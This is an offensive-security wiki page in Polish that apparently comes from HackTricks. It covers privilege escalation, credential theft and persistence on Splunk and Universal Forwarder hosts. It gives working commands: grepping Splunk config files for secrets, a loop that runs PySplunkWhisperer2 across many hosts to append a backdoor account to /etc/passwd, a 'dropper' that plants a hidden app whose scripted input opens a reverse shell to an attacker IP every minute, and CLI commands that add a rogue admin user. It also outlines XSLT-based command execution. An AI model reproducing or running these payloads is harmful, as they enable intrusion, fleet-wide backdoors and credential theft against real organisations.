# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Jeśli podczas **enumeracji** maszyny **wewnętrznie** lub **zewnętrznie** znajdziesz **Splunk działający** (zwykle **8000** dla web UI i **8089** dla management API), prawidłowe dane uwierzytelniające często można przekształcić w **code execution** przez instalację app, scripted inputs lub działania zarządzające. Jeśli Splunk działa jako **root**, bardzo często oznacza to natychmiastową **privilege escalation**.

Jeśli potrzebujesz tylko ogólnej zdalnej powierzchni ataku, enumeracji albo ścieżki RCE przez upload app, sprawdź:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Jeśli jesteś już **root** i usługa Splunk nie nasłuchuje wyłącznie na localhost, możesz też ukraść **Splunk password hashes**, odzyskać **encrypted secrets** albo wgrać **malicious app**, aby utrzymać persistence lokalnie lub na wielu forwarders.

## Interesting Local Files

Gdy trafisz na host z uruchomionym Splunk lub Splunk Universal Forwarder, zwykle najbardziej interesujące są te ścieżki:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Istotne artefakty:

- **`$SPLUNK_HOME/etc/passwd`**: lokalni użytkownicy Splunk i hashe haseł.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: klucz używany przez Splunk do szyfrowania sekretów przechowywanych w kilku plikach `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: początkowy plik bootstrap dla admina; przydatny w gold images i błędach provisioning. Jest ignorowany, jeśli `etc/passwd` już istnieje.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: miejsce, gdzie zwykle włącza się scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** lub **`$SPLUNK_HOME/etc/apps/`**: dobre miejsca, aby ukryć persistent app lub sprawdzić, co jest już dystrybuowane.

## Splunk Universal Forwarder Agent Exploit Summary

Więcej szczegółów znajdziesz w [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). To tylko podsumowanie:

**Przegląd exploita:**
Exploit atakujący Splunk Universal Forwarder (UF) pozwala atakującym z **agent password** na wykonanie dowolnego kodu na systemach uruchamiających agenta, potencjalnie kompromitując dużą część środowiska.

**Dlaczego to działa:**

- Usługa zarządzania UF jest często wystawiona na **TCP 8089**.
- Atakujący mogą uwierzytelnić się w API i nakazać forwarderowi instalację **malicious app bundle**.
- Tę samą prymitywę można wykorzystać lokalnie do **LPE** albo zdalnie do **RCE**.
- Publiczne narzędzia, takie jak **SplunkWhisperer2**, automatycznie tworzą app bundle i mogą dostosować payloads do celów Linux.

**Typowe sposoby odzyskania hasła:**

- Poświadczenia w postaci cleartext w dokumentacji, skryptach, udziałach lub automatyzacji deployment.
- Hashe haseł w `$SPLUNK_HOME/etc/passwd` z późniejszym offline cracking.
- Golden images lub pozostałości po provisioning, takie jak `user-seed.conf`.

**Wpływ:**

- Wykonanie kodu na poziomie SYSTEM/root na każdym skompromitowanym hoście.
- Wdrożenie persistent apps, backdoorów lub ransomware.
- Wyłączenie albo manipulacja telemetry przed przekazaniem danych dalej.

**Przykładowe polecenie do exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Użyteczne publiczne exploity:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

Jeśli masz dostęp do zapisu w **filesystem** jako `root`/`splunk` albo uwierzytelniony dostęp do instalowania apps, bardzo niezawodnym mechanizmem persistence jest wrzucenie **custom app** z **scripted input**. Dokumentacja Splunk zakłada, że scripted inputs mają znajdować się w katalogu app i być włączane z `inputs.conf`.

Typowy układ:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimalny `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Szybki Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Uwagi:

- Ten sam trik działa na **Universal Forwarder** używając `/opt/splunkforwarder/etc/apps/`.
- Atakujący często wtapiają się w otoczenie, modyfikując legalny add-on zamiast tworzyć oczywiście złośliwą app.
- Na **deployment server**, umieszczenie złośliwej app w `deployment-apps/` daje **persistence obejmującą całą flotę**, ponieważ forwarders sprawdzają dostępność, pobierają zaktualizowane app i często uruchamiają się ponownie, aby je zastosować.

## Kradzież credentials i przejęcie admina

Jeśli możesz czytać lokalne pliki Splunk, zwykle są dwa dobre cele: odzyskanie dostępu **Splunk admin** i odzyskanie **zaszyfrowanych service credentials**.

### Password hashes i local users

Splunk przechowuje lokalne dane uwierzytelniania w `etc/passwd`. W zależności od deploymentu, cracking tego pliku może odzyskać działające credentials do web UI i management API.

Jeśli masz już poprawne credentials **admin** i Splunk używa swojego **native** backendu uwierzytelniania, sam CLI może być użyty do persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` i encrypted values

Splunk używa `etc/auth/splunk.secret` do ochrony wrażliwych wartości przechowywanych w wielu plikach konfiguracyjnych. Jeśli możesz ukraść zarówno **secret**, jak i odpowiednie pliki **`.conf`**, często możesz odzyskać lub odtworzyć:

- shared secrets forwarder/indexer, takie jak `pass4SymmKey`
- hasła do prywatnych kluczy TLS, takie jak `sslPassword`
- poświadczenia LDAP bind, takie jak `bindDNPassword`

Jest to przydatne do **lateral movement** nawet wtedy, gdy samo hasło admina Splunk nie daje się złamać.

### `user-seed.conf` abuse

`user-seed.conf` jest używany tylko podczas pierwszego startu albo gdy `etc/passwd` nie istnieje. To czyni go mniej użytecznym na działającym hoście, ale bardzo interesującym w:

- przejętych szablonach instalacji
- obrazach kontenerów
- workflowach bezobsługowego provisioningu
- appliance’ach, gdzie Splunk jest automatycznie reinicjalizowany

W takich przypadkach umieszczenie `HASHED_PASSWORD` wygenerowanego przez `splunk hash-passwd` daje Ci cichy sposób na odzyskanie dostępu admina po redeployment.

## Abusing Splunk Queries

For further details check [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Przydatną niedawną techniką jest abuse **user-supplied XSLT** w podatnych wersjach Splunk Enterprise, aby zamienić uwierzytelnione konto o niskich uprawnieniach w **OS command execution** jako użytkownik `splunk`.

Ogólny flow:

1. Uwierzytelnij się w Splunk.
2. Prześlij złośliwy plik **XSL** przez funkcjonalność podglądu/przesyłania.
3. Spraw, aby Splunk renderował wyniki wyszukiwania z tym przesłanym stylesheet z katalogu **dispatch**.
4. Użyj payloadu XSLT, aby zapisać plik albo wywołać execution przez pipeline wyszukiwania Splunk (na przykład przez dotarcie do wewnętrznej funkcjonalności, takiej jak `runshellscript`).

Ważny ofensywny wniosek jest taki, że ta ścieżka to **post-auth RCE without needing app upload**. Na Linux zwykle kończysz na koncie **`splunk`**, co nadal jest cenne, ponieważ ten użytkownik często jest właścicielem drzewa aplikacji, może czytać secrets i może podkładać persistent apps, które przetrwają utratę shell.

Reprezentatywna ścieżka używana podczas exploitation to:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Jeśli Splunk działa z zbyt dużymi uprawnieniami albo jeśli użytkownik `splunk` ma dostęp do niebezpiecznych skryptów, zapisywalnych jednostek usługi lub błędnych reguł `sudo`, staje się to czystym łańcuchem **LPE**.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
